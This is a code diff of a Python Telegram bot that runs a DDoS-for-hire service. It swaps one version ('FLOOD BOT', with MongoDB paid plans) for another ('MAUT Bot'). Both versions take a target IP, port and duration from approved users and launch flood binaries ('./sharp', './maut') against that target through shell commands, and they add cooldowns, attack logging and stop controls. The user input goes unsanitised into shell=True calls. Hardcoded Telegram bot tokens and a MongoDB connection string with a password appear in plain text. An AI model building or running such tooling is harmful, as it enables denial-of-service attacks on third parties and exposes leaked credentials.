@@ -1,336 +1,251 @@
-import os
 import telebot
-import logging
-import time
-from pymongo import MongoClient
-from datetime import datetime, timedelta
-import certifi
-import asyncio
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-from threading import Thread
 import subprocess
+import datetime
+import os
+from telebot import types
+import time
+import re
+from threading import Lock
 import signal
 
-# ========== CONFIGURATION ==========
-TOKEN = '7724010740:AAHl1Avs1FDKlfvTjABS3ffe6-nVhkcGCj0'
-ADMIN_IDS = [8167507955]  # Admin user IDs
-OWNER_USERNAME = "@seedhe_maut_bot"
-MONGO_URI = 'mongodb+srv://zeni:1I8uJt78Abh4K5lo@zeni.v7yls.mongodb.net/?retryWrites=true&w=majority&appName=zeni'
-CHANNEL_ID = -1002512368825
-BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]
-# ===================================
+# Bot configuration
+bot = telebot.TeleBot('7970310406:AAGh47IMJxhCPwqTDe_3z3PCvXugf7Y3yYE')
+admin_id = {"8167507955"}
+USER_FILE = "users.txt"
+USER_TIME_LIMITS = "user_limits.txt"
+LOG_FILE = "attack_logs.txt"
+COOLDOWN_TIME = 600  # 5 minutes
+MAX_ATTACK_TIME = 240  # 3 minutes
+IMAGE_URL = "https://t.me/gggkkkggggiii/9"
 
-# Initialize logging
-logging.basicConfig(
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
-    level=logging.INFO,
-    handlers=[
-        logging.FileHandler('bot.log'),
-        logging.StreamHandler()
-    ]
-)
+# Data storage
+user_attack_data = {}
+maut_cooldown = {}
+allowed_user_ids = []
+user_time_limits = {}
+active_attacks = {}  # Track active attacks
+attack_lock = Lock()  # Thread lock for attack operations
+attack_processes = {}  # Track attack processes for stopping
 
-# Database setup
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['zoya']
-users_collection = db.users
-
-# Bot initialization
-bot = telebot.TeleBot(TOKEN)
-
-# Global attack manager
-class AttackManager:
-    def __init__(self):
-        self.active_attacks = {}  # {user_id: {pid: process}}
-        self.lock = asyncio.Lock()
-
-    async def start_attack(self, user_id, target_ip, target_port, duration):
-        try:
-            if target_port in BLOCKED_PORTS:
-                raise ValueError(f"Port {target_port} is blocked")
-
-            # Start the attack process
-            cmd = f"./sharp {target_ip} {target_port} {duration}"
-            process = await asyncio.create_subprocess_shell(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE
-            )
-            
-            async with self.lock:
-                if user_id not in self.active_attacks:
-                    self.active_attacks[user_id] = {}
-                self.active_attacks[user_id][process.pid] = process
-
-            # Wait for process to complete
-            stdout, stderr = await process.communicate()
-            
-            # Clean up
-            async with self.lock:
-                if user_id in self.active_attacks and process.pid in self.active_attacks[user_id]:
-                    del self.active_attacks[user_id][process.pid]
-                    if not self.active_attacks[user_id]:
-                        del self.active_attacks[user_id]
-
-            return True
-        except Exception as e:
-            logging.error(f"Attack error: {e}")
-            return False
-
-    async def stop_user_attacks(self, user_id):
-        stopped = 0
-        async with self.lock:
-            if user_id in self.active_attacks:
-                for pid, process in list(self.active_attacks[user_id].items()):
-                    try:
-                        process.terminate()
-                        await process.wait()
-                        stopped += 1
-                    except Exception as e:
-                        logging.error(f"Error stopping process {pid}: {e}")
-                del self.active_attacks[user_id]
-        return stopped
-
-    async def stop_all_attacks(self):
-        stopped = 0
-        async with self.lock:
-            for user_id in list(self.active_attacks.keys()):
-                stopped += await self.stop_user_attacks(user_id)
-        return stopped
-
-# Initialize attack manager
-attack_manager = AttackManager()
-
-# Helper functions
-def is_admin(user_id):
-    return user_id in ADMIN_IDS
-
-def is_approved(user_id):
-    user = users_collection.find_one({"user_id": user_id})
-    return user and user.get('plan', 0) > 0
-
-def get_user_plan(user_id):
-    user = users_collection.find_one({"user_id": user_id})
-    return user.get('plan', 0) if user else 0
-
-# Command handlers
-@bot.message_handler(commands=['start'])
-def start(message):
-    """Main menu with buttons"""
-    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add(
-        KeyboardButton("🌊 FLOOD START"),
-        KeyboardButton("🛑 STOP ATTACK"),
-        KeyboardButton("👤 MY ACCOUNT"),
-        KeyboardButton("🛡️ ADMIN")
-    )
-    bot.send_message(
-        message.chat.id,
-        f"*🚀 FLOOD BOT*\nOwner: {OWNER_USERNAME}\n\n"
-        "Select an option below:",
-        reply_markup=markup,
-        parse_mode='Markdown'
-    )
-
-@bot.message_handler(commands=['approve', 'disapprove'])
-def handle_approval(message):
-    """Admin commands for user management"""
-    if not is_admin(message.from_user.id):
-        bot.reply_to(message, "❌ Admin only command", parse_mode='Markdown')
-        return
-
+def load_users():
+    global allowed_user_ids, user_time_limits
     try:
-        parts = message.text.split()
-        if len(parts) < 2:
-            raise ValueError("Invalid format. Use:\n"
-                           "/approve USER_ID PLAN DAYS\n"
-                           "/disapprove USER_ID")
-
-        target_id = int(parts[1])
-        
-        if parts[0] == '/approve':
-            if len(parts) < 4:
-                raise ValueError("Need plan and days")
-            plan = int(parts[2])
-            days = int(parts[3])
-            
-            # Plan limits
-            if plan == 1 and users_collection.count_documents({"plan": 1}) >= 99:
-                raise ValueError("Plan 1 limit reached (99 users)")
-            if plan == 2 and users_collection.count_documents({"plan": 2}) >= 499:
-                raise ValueError("Plan 2 limit reached (499 users)")
-
-            expiry = datetime.now() + timedelta(days=days)
-            users_collection.update_one(
-                {"user_id": target_id},
-                {"$set": {
-                    "plan": plan,
-                    "valid_until": expiry.isoformat(),
-                    "access_count": 0
-                }},
-                upsert=True
-            )
-            bot.reply_to(message, 
-                        f"✅ Approved user {target_id}\n"
-                        f"Plan: {plan}\n"
-                        f"Days: {days}",
-                        parse_mode='Markdown')
-            
-        elif parts[0] == '/disapprove':
-            users_collection.update_one(
-                {"user_id": target_id},
-                {"$set": {"plan": 0, "valid_until": ""}}
-            )
-            bot.reply_to(message, f"❌ Disapproved user {target_id}", parse_mode='Markdown')
-            
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')
-
-@bot.message_handler(func=lambda m: m.text == "🌊 FLOOD START")
-def flood_start(message):
-    """Initiate flood attack"""
-    if not is_approved(message.from_user.id):
-        bot.reply_to(message, 
-                    "❌ You're not approved\n"
-                    "Contact admin for access",
-                    parse_mode='Markdown')
-        return
-        
-    bot.reply_to(message, 
-                "Enter attack parameters:\n"
-                "<IP> <PORT> <TIME in seconds>\n\n"
-                "Example: 1.1.1.1 80 60",
-                parse_mode='Markdown')
-    bot.register_next_step_handler(message, process_flood)
-
-def process_flood(message):
-    """Process flood parameters"""
+        with open(USER_FILE, "r") as f:
+            allowed_user_ids = f.read().splitlines()
+    except FileNotFoundError:
+        allowed_user_ids = []
+    
     try:
-        parts = message.text.split()
-        if len(parts) != 3:
-            raise ValueError("Need exactly 3 parameters (IP PORT TIME)")
-            
-        ip = parts[0]
-        port = int(parts[1])
-        time_ = parts[2]
-        
-        # Validate port
-        if port in BLOCKED_PORTS:
-            raise ValueError(f"Port {port} is blocked")
-            
-        # Check user plan limits
-        user_plan = get_user_plan(message.from_user.id)
-        if user_plan == 1 and int(time_) > 120:
-            raise ValueError("Plan 1 max time is 120 seconds")
-        elif user_plan == 2 and int(time_) > 300:
-            raise ValueError("Plan 2 max time is 300 seconds")
-            
-        # Launch attack
-        asyncio.run_coroutine_threadsafe(
-            attack_manager.start_attack(message.from_user.id, ip, port, time_),
-            loop
-        )
-        
-        bot.reply_to(message,
-            f"⚡ Attack launched successfully!\n\n"
-            f"Target: {ip}:{port}\n"
-            f"Duration: {time_} seconds\n\n"
-            f"Use '🛑 STOP ATTACK' to cancel",
-            parse_mode='Markdown'
-        )
-    except ValueError as e:
-        bot.reply_to(message, f"❌ Invalid input: {str(e)}", parse_mode='Markdown')
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')
+        with open(USER_TIME_LIMITS, "r") as f:
+            for line in f:
+                user_id, limit_sec, expiry = line.strip().split("|")
+                user_time_limits[user_id] = (int(limit_sec), float(expiry))
+    except FileNotFoundError:
+        user_time_limits = {}
 
-@bot.message_handler(func=lambda m: m.text == "🛑 STOP ATTACK")
+def save_users():
+    with open(USER_FILE, "w") as f:
+        f.write("\n".join(allowed_user_ids))
+    
+    with open(USER_TIME_LIMITS, "w") as f:
+        for user_id, (limit_sec, expiry) in user_time_limits.items():
+            f.write(f"{user_id}|{limit_sec}|{expiry}\n")
+
+def log_attack(user_id, target, port, time, status="STARTED"):
+    try:
+        user = bot.get_chat(user_id)
+        username = f"@{user.username}" if user.username else f"ID:{user_id}"
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{datetime.datetime.now()} | {username} | {target}:{port} | {time}s | {status}\n")
+    except Exception as e:
+        print(f"Logging error: {e}")
+
+def parse_time_input(time_str):
+    time_str = time_str.lower()
+    total_seconds = 0
+    
+    matches = re.findall(r'(\d+)\s*(day|hour|min|sec|d|h|m|s)', time_str)
+    
+    for amount, unit in matches:
+        amount = int(amount)
+        if unit in ['day', 'd']:
+            total_seconds += amount * 86400
+        elif unit in ['hour', 'h']:
+            total_seconds += amount * 3600
+        elif unit in ['min', 'm']:
+            total_seconds += amount * 60
+        elif unit in ['sec', 's']:
+            total_seconds += amount
+    
+    return total_seconds if total_seconds > 0 else None
+
+def is_attack_active():
+    with attack_lock:
+        return bool(active_attacks)
+
+def add_active_attack(user_id, attack_time, process):
+    with attack_lock:
+        active_attacks[user_id] = {
+            'start_time': datetime.datetime.now(),
+            'duration': attack_time,
+            'process': process
+        }
+
+def remove_active_attack(user_id):
+    with attack_lock:
+        if user_id in active_attacks:
+            if 'process' in active_attacks[user_id] and active_attacks[user_id]['process']:
+                try:
+                    os.killpg(os.getpgid(active_attacks[user_id]['process'].pid), signal.SIGTERM)
+                except:
+                    pass
+            del active_attacks[user_id]
+
+def get_active_attack_info():
+    with attack_lock:
+        if not active_attacks:
+            return None
+        user_id, attack = next(iter(active_attacks.items()))
+        elapsed = (datetime.datetime.now() - attack['start_time']).seconds
+        remaining = max(0, attack['duration'] - elapsed)
+        return user_id, remaining, attack['process']
+
+@bot.message_handler(commands=['stop'])
 def stop_attack(message):
-    """Stop user's attacks"""
+    user_id = str(message.chat.id)
+    
+    active_info = get_active_attack_info()
+    if not active_info:
+        return bot.reply_to(message, "ℹ️ No active attack to stop.")
+    
+    active_user_id, remaining, process = active_info
+    
+    # Only allow the attacking user or admin to stop
+    if user_id != active_user_id and user_id not in admin_id:
+        return bot.reply_to(message, "❌ You can only stop your own attacks.")
+    
     try:
-        stopped = asyncio.run_coroutine_threadsafe(
-            attack_manager.stop_user_attacks(message.from_user.id),
-            loop
-        ).result()
-        
-        if stopped > 0:
-            bot.reply_to(message, f"🛑 Stopped {stopped} active attacks", parse_mode='Markdown')
-        else:
-            bot.reply_to(message, "⚠️ No active attacks found", parse_mode='Markdown')
+        remove_active_attack(active_user_id)
+        log_attack(active_user_id, "", "", 0, "STOPPED")
+        bot.reply_to(message, "✅ Attack stopped successfully.")
     except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')
+        bot.reply_to(message, f"❌ Error stopping attack: {str(e)}")
 
-@bot.message_handler(func=lambda m: m.text == "👤 MY ACCOUNT")
-def account_info(message):
-    """Show user account status"""
-    user = users_collection.find_one({"user_id": message.from_user.id})
-    if user:
-        status = "✅ Approved" if user.get('plan', 0) > 0 else "❌ Not approved"
-        plan_name = {1: "Basic", 2: "Premium"}.get(user.get('plan', 0), "None")
-        
-        response = (
-            f"*ACCOUNT INFORMATION*\n\n"
-            f"🆔 User ID: `{message.from_user.id}`\n"
-            f"👤 Username: @{message.from_user.username or 'N/A'}\n"
-            f"📊 Plan: {plan_name} ({user.get('plan', 0)})\n"
-            f"⏳ Valid until: {user.get('valid_until', 'N/A')}\n"
-            f"🔒 Status: {status}"
-        )
-    else:
-        response = "❌ No account found. Contact admin for access."
-    bot.reply_to(message, response, parse_mode='Markdown')
-
-@bot.message_handler(func=lambda m: m.text == "🛡️ ADMIN")
-def admin_contact(message):
-    """Show admin contact"""
-    bot.reply_to(message, 
-                f"🛡️ *Admin Contact*\n\n"
-                f"For approvals or support:\n"
-                f"{OWNER_USERNAME}",
-                parse_mode='Markdown')
-
-# Admin-only commands
-@bot.message_handler(commands=['stopall'])
-def admin_stop_all(message):
-    """Admin command to stop all attacks"""
-    if not is_admin(message.from_user.id):
-        bot.reply_to(message, "❌ Admin only command", parse_mode='Markdown')
-        return
-        
+@bot.callback_query_handler(func=lambda call: True)
+def handle_buttons(call):
+    user_id = str(call.message.chat.id)
+    
     try:
-        stopped = asyncio.run_coroutine_threadsafe(
-            attack_manager.stop_all_attacks(),
-            loop
-        ).result()
-        bot.reply_to(message, f"🛑 Stopped all attacks ({stopped} total)", parse_mode='Markdown')
+        # Always answer callback immediately to prevent timeout
+        bot.answer_callback_query(call.id)
+        
+        if call.data == "start_attack":
+            if user_id not in user_attack_data:
+                bot.answer_callback_query(call.id, "❌ Session expired. Use /maut")
+                return
+            
+            data = user_attack_data[user_id]
+            try:
+                # Start attack in a separate thread to avoid blocking
+                def execute_attack():
+                    try:
+                        # Create new process group for the attack
+                        process = subprocess.Popen(
+                            f"./maut {data['ip']} {data['port']} {data['time']} 900", 
+                            shell=True, 
+                            preexec_fn=os.setsid
+                        )
+                        
+                        # Mark attack as active
+                        add_active_attack(user_id, int(data['time']), process)
+                        log_attack(user_id, data['ip'], data['port'], data['time'])
+                        maut_cooldown[user_id] = datetime.datetime.now()
+                        
+                        # Update message
+                        bot.edit_message_text(
+                            chat_id=call.message.chat.id,
+                            message_id=call.message.message_id,
+                            text=f"🔥 *Attack Launched!* 🔥\n\n"
+                                 f"🌐 Target: `{data['ip']}`\n"
+                                 f"🔌 Port: `{data['port']}`\n"
+                                 f"⏱ Duration: `{data['time']}`s\n\n"
+                                 f"Use /stop to cancel attack\n\n"
+                                 f"[⚡ Powered by @seedhe_maut_bot](https://t.me/seedhe_maut_bot)",
+                            parse_mode="Markdown"
+                        )
+                        
+                        # Wait for attack to complete
+                        time.sleep(int(data['time']))
+                        
+                        # Remove from active attacks if not already stopped
+                        if user_id in active_attacks:
+                            remove_active_attack(user_id)
+                            
+                            # Send completion message
+                            bot.send_message(
+                                call.message.chat.id,
+                                f"✅ *Attack Completed!*\n\n"
+                                f"🌐 Target: `{data['ip']}`\n"
+                                f"⏱ Duration: `{data['time']}`s\n\n"
+                                f"Cooldown: {COOLDOWN_TIME//60} minutes",
+                                parse_mode="Markdown"
+                            )
+                            
+                            # Add new attack button
+                            markup = types.InlineKeyboardMarkup()
+                            markup.add(types.InlineKeyboardButton("⚡ New Attack", callback_data="new_attack"))
+                            bot.send_message(call.message.chat.id, "Attack finished! You can launch a new one when cooldown ends.", reply_markup=markup)
+                    
+                    except Exception as e:
+                        if user_id in active_attacks:
+                            remove_active_attack(user_id)
+                        bot.send_message(call.message.chat.id, f"❌ Attack failed: {str(e)}")
+                
+                # Start attack in background thread
+                import threading
+                threading.Thread(target=execute_attack).start()
+                
+            except Exception as e:
+                remove_active_attack(user_id)
+                bot.edit_message_text(
+                    chat_id=call.message.chat.id,
+                    message_id=call.message.message_id,
+                    text=f"❌ Error: {str(e)}"
+                )
+        
+        elif call.data == "cancel_attack":
+            bot.edit_message_text(
+                chat_id=call.message.chat.id,
+                message_id=call.message.message_id,
+                text="❌ Attack cancelled"
+            )
+        
+        elif call.data == "new_attack":
+            if user_id in maut_cooldown:
+                remaining = COOLDOWN_TIME - (datetime.datetime.now() - maut_cooldown[user_id]).seconds
+                if remaining > 0:
+                    bot.answer_callback_query(call.id, f"⏳ Wait {remaining} seconds")
+                    return
+            
+            bot.send_message(call.message.chat.id, "⚡ Send new attack command:\n`/maut <ip> <port> <time>`", parse_mode="Markdown")
+    
     except Exception as e:
-        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode='Markdown')
-
-# ========== MAIN EXECUTION ==========
-def run_bot():
-    """Main bot running function"""
-    logging.info("Starting bot...")
-    while True:
+        print(f"Error handling callback: {e}")
         try:
-            bot.polling(none_stop=True, interval=1, timeout=30)
-        except Exception as e:
-            logging.error(f"Polling error: {e}")
-            time.sleep(10)
+            bot.answer_callback_query(call.id, "⚠️ An error occurred")
+        except:
+            pass
 
-if __name__ == "__main__":
-    # Initialize asyncio loop
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    # Start bot in separate thread
-    bot_thread = Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-    
-    # Run asyncio loop in main thread
+# ... [rest of your existing handlers remain the same] ...
+
+# Initialize
+load_users()
+
+# Start bot
+print("⚡ MAUT Bot Started ⚡")
+while True:
     try:
-        loop.run_forever()
-    except KeyboardInterrupt:
-        logging.info("Shutting down...")
-        # Clean up all attacks on shutdown
-        asyncio.run_coroutine_threadsafe(attack_manager.stop_all_attacks(), loop).result()
-    finally:
-        loop.close()
+        bot.polling(none_stop=True)
+    except Exception as e:
+        print(f"Error: {e}")
+        time.sleep(5)
